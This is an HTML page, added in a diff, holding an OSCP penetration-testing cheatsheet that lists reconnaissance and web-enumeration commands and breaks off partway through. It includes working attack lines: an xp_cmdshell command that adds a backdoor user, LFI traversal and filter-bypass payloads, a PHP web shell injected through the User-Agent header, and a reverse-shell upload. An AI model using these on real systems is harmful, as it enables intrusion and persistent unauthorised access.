@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>OSCP Cheatsheet - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "OSCP Cheatsheet", url: "#_top", children: [
+              {title: "OSINT", url: "#osint" },
+              {title: "Reconnaissance", url: "#reconnaissance" },
+              {title: "Network", url: "#network" },
+              {title: "Databases", url: "#databases" },
+              {title: "Web", url: "#web" },
+              {title: "Brute Forcing Online", url: "#brute-forcing-online" },
+              {title: "Exploitation", url: "#exploitation" },
+              {title: "Initial Shell Checks", url: "#initial-shell-checks" },
+              {title: "Shells", url: "#shells" },
+              {title: "Privilege Escalation - Linux", url: "#privilege-escalation-linux" },
+              {title: "Privilege Escalation - Windows", url: "#privilege-escalation-windows" },
+              {title: "Privilege Escalation Exploits", url: "#privilege-escalation-exploits" },
+              {title: "Dumping Credentials", url: "#dumping-credentials" },
+              {title: "Network Pivoting", url: "#network-pivoting" },
+              {title: "OSCP Post Checks", url: "#oscp-post-checks" },
+              {title: "House Cleaning", url: "#house-cleaning" },
+              {title: "CheatSheets", url: "#cheatsheets" },
+              {title: "Other Resources", url: "#other-resources" },
+              {title: "OSCP Resources", url: "#oscp-resources" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="oscp-cheatsheet">OSCP Cheatsheet</h1>
+<p>This was the cheatsheet and containing the methodologies that were compiled when I took my OSCP.</p>
+<p>I just left this as is and made a bigger cheatsheet on top of this, which is this site.</p>
+<hr />
+<h2 id="osint">OSINT</h2>
+<ul>
+<li>GDorks</li>
+<li>Open up the social media accounts</li>
+</ul>
+<hr />
+<h2 id="reconnaissance">Reconnaissance</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-sP<span class="w"> </span><span class="nv">$subnet</span><span class="w"> </span>-oA<span class="w"> </span>sP-<span class="nv">$subnet</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>nmap<span class="w"> </span>-sS<span class="w"> </span><span class="nv">$host</span><span class="w"> </span>-oA<span class="w"> </span>sS-<span class="nv">$rhost</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>nmap<span class="w"> </span>-A<span class="w"> </span>-p<span class="w"> </span><span class="nv">$ports</span><span class="w"> </span>-oA<span class="w"> </span>A-<span class="nv">$rhost</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>nmap<span class="w"> </span>-sS<span class="w"> </span>-T4<span class="w"> </span>-p-<span class="w"> </span><span class="nv">$host</span><span class="w"> </span>-oA<span class="w"> </span>-sS-T4-p-<span class="nv">$rhost</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>nmap<span class="w"> </span>-sC<span class="w"> </span>-T4<span class="w"> </span><span class="nv">$host</span><span class="w">  </span>-oA<span class="w"> </span>sC-T4-<span class="nv">$host</span><span class="w">  </span>nmap<span class="w"> </span>-sT<span class="w"> </span>-T4<span class="w"> </span><span class="nv">$host</span><span class="w"> </span>-oA<span class="w"> </span>sT-T4-<span class="nv">$rhost</span><span class="w">  </span>nmap<span class="w"> </span>-sA<span class="w"> </span>-T4<span class="w"> </span><span class="nv">$rhost</span><span class="w"> </span>-oA<span class="w"> </span>sA-T4-<span class="nv">$rhost</span><span class="w"> </span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>unicornscan<span class="w"> </span>-v<span class="w"> </span>-m<span class="w"> </span>U<span class="w"> </span>-p<span class="w"> </span>all<span class="w"> </span><span class="nv">$rhost</span><span class="w"> </span>unicornscan-udp-<span class="nv">$rhost</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>python3<span class="w"> </span>autorecon.py<span class="w"> </span><span class="nv">$rhost</span>
+</span></code></pre></div>
+<h3 id="more-nmap">More NMAP</h3>
+<ul>
+<li>NOTE: Just use <a href="https://github.com/projectdiscovery/naabu">naabu</a> from Project Discovery for basic TCP port scanning
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo ~/go/bin/naabu -stats -verify -l hosts.txt -output output.txt
+</span></code></pre></div></li>
+<li>Another alternative (Massscan)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sudo masscan -p 0-65535 --open -iL hosts.txt -oG output.txt|tee -a output_backup.txt
+</span></code></pre></div></li>
+<li>Speeding up NMAP (arguments)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>-T4 --max-rtt-timeout 200ms --max-retries 1 --max-scan-delay 10ms --min-hostgroup 64 --version-intensity 1
+</span></code></pre></div></li>
+<li>Resume NMAP scan
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a># Which is why it is import to do -oX or -oA
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>nmap --resume previous_cancelled_output.xml
+</span></code></pre></div></li>
+</ul>
+<hr />
+<h2 id="network">Network</h2>
+<ul>
+<li>SNMP: 
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="w">    </span>snmp-check<span class="w"> </span><span class="nv">$rhost</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">    </span>snmpwalk<span class="w"> </span>-v<span class="w"> </span><span class="nv">$snmpVersion</span><span class="w"> </span>-c<span class="w"> </span><span class="nv">$snmpComString</span><span class="w"> </span><span class="nv">$rhost</span>
+</span></code></pre></div></li>
+<li>
+<p>RPC:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="w">    </span>enum4linux<span class="w"> </span><span class="nv">$rhost</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">    </span>python<span class="w"> </span>ridenum.py<span class="w"> </span><span class="nv">$rhost</span><span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">50000</span><span class="w"> </span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">    </span><span class="c1"># Note Max: 100 range only. duplicate py and edit, add on line #97 sid=&quot;S-1-5-21-3001938989-124212845-530053634&quot;, get the sid from rpcclient manually using command lookupnames root or administrator</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">    </span>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="nv">$rhost</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">    </span>smbtree<span class="w"> </span><span class="nv">$rhost</span>
+</span></code></pre></div></p>
+</li>
+<li>
+<p>NFS: 
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="w">    </span>showmount<span class="w"> </span>-e<span class="w"> </span><span class="nv">$rhost</span>
+</span></code></pre></div></p>
+</li>
+<li>
+<p>SMB/SAMBA:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="w">    </span><span class="c1">#!/bin/sh</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">    </span><span class="c1">#Author: rewardone</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">    </span><span class="c1">#Thanks fellow student OS-40285!</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">    </span><span class="c1">#</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="w">    </span><span class="c1">#Description:</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="w">    </span><span class="c1"># enum4linux messed up and doesnt report samba version.</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="w">    </span><span class="c1"># </span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="w">    </span><span class="c1"># Requires root or enough permissions to use tcpdump</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="w">    </span><span class="c1"># Will listen for the first 7 packets of a null login</span>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="w">    </span><span class="c1"># and grab the SMB Version</span>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="w">    </span><span class="c1">#Notes:</span>
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="w">    </span><span class="c1"># Will sometimes not capture or will print multiple</span>
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a><span class="w">    </span><span class="c1"># lines. May need to run a second time for success.</span>
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-z<span class="w"> </span><span class="nv">$1</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Usage: </span><span class="nv">$0</span><span class="s2"> &lt;ipaddress&gt; &lt;port&gt;&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>exit<span class="p">;</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="nv">rhost</span><span class="o">=</span><span class="nv">$1</span><span class="p">;</span><span class="w"> </span><span class="k">fi</span><span class="w"> </span>
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>!<span class="w"> </span>-z<span class="w"> </span><span class="nv">$2</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="nv">rport</span><span class="o">=</span><span class="nv">$2</span><span class="p">;</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="nv">rport</span><span class="o">=</span><span class="m">139</span><span class="p">;</span><span class="w"> </span><span class="k">fi</span>
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a><span class="w">    </span>tcpdump<span class="w"> </span>-s0<span class="w"> </span>-n<span class="w"> </span>-i<span class="w"> </span>tap0<span class="w"> </span>src<span class="w"> </span><span class="nv">$rhost</span><span class="w"> </span>and<span class="w"> </span>port<span class="w"> </span><span class="nv">$rport</span><span class="w"> </span>-A<span class="w"> </span>-c<span class="w"> </span><span class="m">7</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;samba\|s.a.m&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;.&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oP<span class="w"> </span><span class="s1">&#39;UnixSamba.*[0-9a-z]&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;\n&#39;</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$rhost</span><span class="s2">: &quot;</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>
+</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;exit&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>smbclient<span class="w"> </span>-L<span class="w"> </span><span class="nv">$rhost</span><span class="w"> </span><span class="m">1</span>&gt;/dev/null<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sleep<span class="w"> </span>.1
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>ls<span class="w"> </span>/usr/share/nmap/scripts<span class="p">|</span>grep<span class="w"> </span>smb-vuln-<span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="o">====================</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="nv">$i</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="o">====================</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>nmap<span class="w"> </span>--script<span class="w"> </span><span class="nv">$i</span><span class="w"> </span>-p<span class="w"> </span><span class="m">139</span>,445<span class="w"> </span><span class="nv">$rhost</span><span class="p">;</span><span class="k">done</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="w">    </span>nmap<span class="w"> </span>-v<span class="w"> </span>-sV<span class="w"> </span>-p<span class="w"> </span><span class="m">139</span>,445<span class="w"> </span>--script<span class="o">=</span><span class="s2">&quot;smb-vuln-*&quot;</span><span class="w"> </span><span class="nv">$rhost</span>
+</span></code></pre></div></p>
+</li>
+<li>FTP:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="w">    </span>nmap<span class="w"> </span>-b<span class="w"> </span>anonymous:anonymous@<span class="nv">$rhost</span><span class="w"> </span><span class="nv">$rhost</span><span class="w"> </span>-p-<span class="w"> </span>-Pn
+</span></code></pre></div></li>
+<li>TCPDUMP:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="w">    </span>tcpdump<span class="w"> </span>-A<span class="w"> </span>-XX<span class="w"> </span>-vvv<span class="w"> </span>-n<span class="w"> </span>-i<span class="w"> </span>eth0<span class="w"> </span>src<span class="w"> </span><span class="nv">$rhost</span>
+</span></code></pre></div></li>
+</ul>
+<hr />
+<h2 id="databases">Databases</h2>
+<ul>
+<li>TNSListener</li>
+<li>MySQL: Executing shell on windows from db:[^35]<ul>
+<li>HackMag<a href="[HackMag](https://hackmag.com/security/hacking-mysql-databases-methods-and-tools/)">^36</a></li>
+</ul>
+</li>
+<li>MSSQL: 
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>    nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse $rhost -p1433 --script-args mssql.username=sa,mssql.password=$password,ms-sql-xp-cmdshell.cmd=&quot;net user backdoor backdoor123 /add&quot;
+</span></code></pre></div></li>
+<li>MSSQL:<ul>
+<li>(From Impacket)
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="w">    </span>./mssqlclient.py<span class="w"> </span>sa:password@<span class="nv">$rhost</span><span class="w"> </span>-p<span class="w"> </span><span class="m">1433</span><span class="w"> </span>
+</span></code></pre></div></li>
+</ul>
+</li>
+</ul>
+<hr />
+<h2 id="web">Web</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>wafw00f<span class="w"> </span>http://<span class="nv">$rhost</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>nikto<span class="w"> </span>-h<span class="w"> </span><span class="nv">$url</span><span class="w"> </span>-C<span class="w"> </span>all<span class="w"> </span>-oX
+</span></code></pre></div>
+<ul>
+<li>Directory: 
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="w">    </span>ffuf<span class="w"> </span>-c<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt<span class="w"> </span>-u<span class="w"> </span>https://gg.example.com/FUZZ<span class="w"> </span>-recursion<span class="w"> </span>-recursion-depth<span class="w"> </span><span class="m">3</span><span class="w"> </span>-recursion-strategy<span class="w"> </span>greedy<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4674.0 Safari/537.36&quot;</span><span class="w"> </span>-o<span class="w"> </span>output
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="w">    </span>gobuster<span class="w"> </span>dir<span class="w"> </span>-w<span class="w"> </span><span class="nv">$dirlist</span><span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$rhost</span><span class="w"> </span>-l<span class="w"> </span>-t<span class="w"> </span><span class="m">50</span><span class="w"> </span><span class="o">(</span>l<span class="w"> </span><span class="k">for</span><span class="w"> </span>size,t<span class="w"> </span><span class="k">for</span><span class="w"> </span>threads<span class="o">)</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="w">    </span>dirbuster<span class="w"> </span>-l<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-1.0.txt<span class="w"> </span><span class="o">=</span>R<span class="w">  </span>-s<span class="w"> </span>/<span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-r<span class="w"> </span>./dirbuster-<span class="nv">$host</span><span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$host</span><span class="w"> </span><span class="o">(</span>Turn<span class="w"> </span>off<span class="w"> </span><span class="s2">&quot;recursive&quot;</span><span class="w">  </span>adjust<span class="w"> </span>threads<span class="w"> </span>to<span class="w"> </span><span class="m">30</span>-45<span class="o">)</span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="w">    </span>cat<span class="w"> </span>~/Results/naabu/naabu_all_ports_withoutIPs_https.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>~/Tools/feroxbuster<span class="w"> </span>--stdin<span class="w"> </span>--parallel<span class="w"> </span><span class="m">10</span><span class="w"> </span>-e<span class="w"> </span>-A<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt<span class="w"> </span>-o<span class="w"> </span>~/Results/feroxbuster/naabu_raft-large-directories.txt
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="w">    </span>skipfish<span class="w"> </span>-YO<span class="w"> </span>http://<span class="nv">$rhost</span>:<span class="nv">$rport</span><span class="w"> </span>-o<span class="w"> </span>skipfish_output
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="w">    </span>wget<span class="w"> </span>-r<span class="w"> </span>http://<span class="nv">$rhost</span>:<span class="nv">$rport</span><span class="w"> </span>-o<span class="w"> </span>wget_output
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="w">    </span><span class="c1"># BurpSuite - Spider from Results of dirbuster</span>
+</span></code></pre></div></li>
+<li>
+<p>Webdav Test
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="w">    </span>davtest<span class="w"> </span>-url<span class="w"> </span><span class="nv">$url</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="w">    </span>cadaver<span class="w"> </span><span class="nv">$url</span>:80
+</span></code></pre></div></p>
+</li>
+<li>
+<p>LFI: 
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="w">    </span>http://<span class="nv">$url</span>/index/../../../../etc/passwd
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="w">    </span><span class="nv">$url</span>/index/../../../../etc/passwd%00
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="w">    </span><span class="se">\n</span><span class="w"> </span><span class="se">\r</span>
+</span></code></pre></div></p>
+<ul>
+<li>Bypass Sanitation:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>    $url/index/2E%2E%%2F%2E%2E%%2F%2E%2E%%2F%2E%2E%%2Fetc%2Fpasswd
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>    $url/index/..\/..\/..\/..\/etc\/passwd
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>    $url/index/..//..//..//..//etc//passwd
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>    $url/index/..///..///..///..///etc///passwd
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>    # http://www.vulnerability-lab.com/resources/documents/587.txt
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="w">    </span>dotdotpwn<span class="w"> </span>-m<span class="w"> </span>http-url<span class="w"> </span>-u<span class="w"> </span>http<span class="o">(</span>s<span class="o">)</span>://<span class="nv">$rhost</span>:<span class="nv">$rport</span>/<span class="nv">$somepage</span>.php?<span class="nv">$page</span><span class="o">=</span>TRAVERSAL<span class="w"> </span>-k<span class="w"> </span><span class="nv">$word</span><span class="w"> </span><span class="o">(</span>root<span class="w"> </span><span class="k">if</span><span class="w"> </span>linux,<span class="w"> </span>find<span class="w"> </span><span class="k">if</span><span class="w"> </span>MS<span class="o">)</span><span class="w"> </span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="w">    </span>LFI_Scanner.py<span class="w"> </span><span class="o">(</span>https://github.com/monkeysm8/CTF-Stuff/blob/master/LFI_Scanner.py<span class="o">)</span>
+</span></code></pre></div></li>
+</ul>
+</li>
+<li>
+<p>LFI to RCE: </p>
+<ul>
+<li>To try first before the proc/self/fd/$numberToFigureOut: Proc/self/environ
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="w">    </span>https://<span class="nv">$url</span>/<span class="nv">$directory</span>/<span class="nv">$somephp</span>.php?<span class="nv">$phpfunction</span><span class="o">=</span>../../../../../../../../../proc/self/fd/<span class="nv">$numberFromFDsizeFindOutfromProcSelfStatus</span><span class="o">(</span>number<span class="w"> </span>usually<span class="w"> </span><span class="m">0</span>-32<span class="o">)</span>
+</span></code></pre></div></li>
+<li>paste the following in User-Agent Burp: <code class="language-php highlight"><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span></code> then access 1st url in this line/section then add =$command at the end <a href="[hackingarticles](https://www.hackingarticles.in/5-ways-exploit-lfi-vulnerability/)">^31</a></li>
+<li>Another version of above. Input <code class="language-php highlight"><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">‘cmd’</span><span class="p">]);</span> <span class="cp">?&gt;</span></code> in URL first then access the access or error log </li>
+<li>Go through this link one by one <a href="[3mrgnc3](https://github.com/3mrgnc3/LFIter2/blob/master/win-fpaths.txt)">^33</a></li>
+</ul>
+</li>
+<li>
+<p>PUT:</p>
+<ul>
+<li>UPLOAD: 
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="w">    </span>curl<span class="w"> </span>--upload-file<span class="w">  </span>php-reverse-shell.txt<span class="w"> </span>-v<span class="w"> </span>--url<span class="w"> </span>http://<span class="nv">$rhost</span>/<span class="nv">$dir</span>/reverse_shell.php<span class="w"> </span>-0<span class="w"> </span>--http1.0
+</span></code></pre></div></li>
+</ul>
+</li>
+<li>Adobe Coldfusion: https://nets.ec/Coldfusion_hacking</li>
+<li>SQLi: 
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="w">    </span>nmap<span class="w"> </span>-sV<span class="w"> </span>-p<span class="w"> </span><span class="nv">$rport</span><span class="w"> </span>--script<span class="o">=</span>http-sql-injection<span class="w"> </span><span class="nv">$rhost</span>
+</span></code></pre></div></li>
+<li>
+<p>WFUZZ:</p>
+<ul>
+<li>Directory:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="w">    </span>wfuzz<span class="w"> </span>-v<span class="w"> </span>-c<span class="w">  </span>-w<span class="w"> </span><span class="nv">$wordlist</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$url</span>/FUZZ<span class="w"> </span>-p<span class="w"> </span><span class="nv">$burpIPandPort</span>:HTTP<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$Cookie_Field</span><span class="s2">&quot;</span><span class="w"> </span>-f<span class="w"> </span>wfuzz_results.txt<span class="w"> </span><span class="c1">#(put FUZZ wherever you want to) </span>
+</span></code></pre></div></li>
+<li>
